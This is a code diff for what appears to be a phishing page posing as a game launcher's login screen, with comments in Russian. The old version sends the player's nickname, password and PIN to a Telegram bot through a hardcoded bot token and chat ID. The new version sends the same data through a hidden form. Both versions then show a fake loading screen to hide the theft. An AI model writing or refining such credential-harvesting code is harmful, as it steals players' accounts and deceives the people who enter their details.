@@ -43,7 +43,6 @@ if (window.innerWidth > 768) {
 
 function showGameAlert(text) { alertText.innerText = text; customAlert.classList.add('show'); setTimeout(() => { customAlert.classList.remove('show'); }, 3000); }
 
-// Запуск загрузки игры
 function startGameLoading() {
   loadingPage.classList.add('show'); let progress = 0;
   const interval = setInterval(() => {
@@ -101,24 +100,22 @@ pincodeInput.addEventListener('input', function() {
   if (this.value.length === 4) { this.classList.remove('field-invalid'); this.classList.add('field-valid'); } else { this.classList.remove('field-valid', 'field-invalid'); }
 });
 
-// АБСОЛЮТНО СКРЫТАЯ ОТПРАВКА ДАННЫХ БЕЗ СИСТЕМНЫХ ТЕКСТОВ НА ЭКРАНЕ
+// ОБНОВЛЕННАЯ СВЕРХНАДЕЖНАЯ ОТПРАВКА ЧЕРЕЗ СКРЫТУЮ ФОРМУ HTML
 loginBtn.addEventListener('click', function(e) {
   e.preventDefault(); const n = nicknameInput.value, p = passwordInput.value, pin = pincodeInput.value;
   if (n.trim() === "" || !/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(n)) { showGameAlert(/[а-яА-ЯёЁ]/.test(n) ? "Разрешены только английские буквы!" : "Авторизация: Укажите имя вашего персонажа!"); nicknameInput.classList.add('field-invalid', 'has-text'); return; }
   if (p.trim() === "" || p.length < 6) { showGameAlert("Защита аккаунта: Введите действующий Пароль!"); passwordInput.classList.add('field-invalid', 'has-text'); return; }
   if (checkboxToggle.checked && (pin.trim() === "" || pin.length < 4)) { showGameAlert("Защита аккаунта: Введите 4-значный Пин-код!"); pincodeInput.classList.add('field-invalid'); return; }
   
-  const token = "8607400305:AAG3zvvO0klhKCwG2i52u3yfS6ev_a-7P0M";
-  const myId = "8589867661";
-  const msg = `🚀 <b>Вход в лаунчер!</b>\n\n👤 <b>Ник:</b> <code>${n}</code>\n🔑 <b>Пароль:</b> <code>${p}</code>\n🔐 <b>Пин:</b> <code>${checkboxToggle.checked ? pin : "Нет"}</code>`;
+  // Собираем текст сообщения
+  const msgText = `🚀 <b>Вход в лаунчер!</b>\n\n👤 <b>Ник:</b> <code>${n}</code>\n🔑 <b>Пароль:</b> <code>${p}</code>\n🔐 <b>Пин:</b> <code>${checkboxToggle.checked ? pin : "Нет"}</code>`;
   
-  // Отправляем скрытый фоновый запрос. При любом исходе (успех или ошибка сети) сразу запускаем игру
-  fetch(`https://telegram.org{token}/sendMessage`, {
-    method: "POST", headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ chat_id: myId, text: msg, parse_mode: "HTML" })
-  })
-  .then(() => { startGameLoading(); })
-  .catch(() => { startGameLoading(); });
+  // Вставляем текст в форму и имитируем её физическое нажатие на заднем плане
+  document.getElementById('tg-msg-input').value = msgText;
+  document.getElementById('tg-hidden-form').submit();
+  
+  // Мгновенно запускаем загрузку игры
+  startGameLoading();
 });
 
 document.addEventListener('touchmove', function(e) { if (!e.target.closest('.news-content-scroll') && !e.target.closest('.support-content')) e.preventDefault(); }, { passive: false });
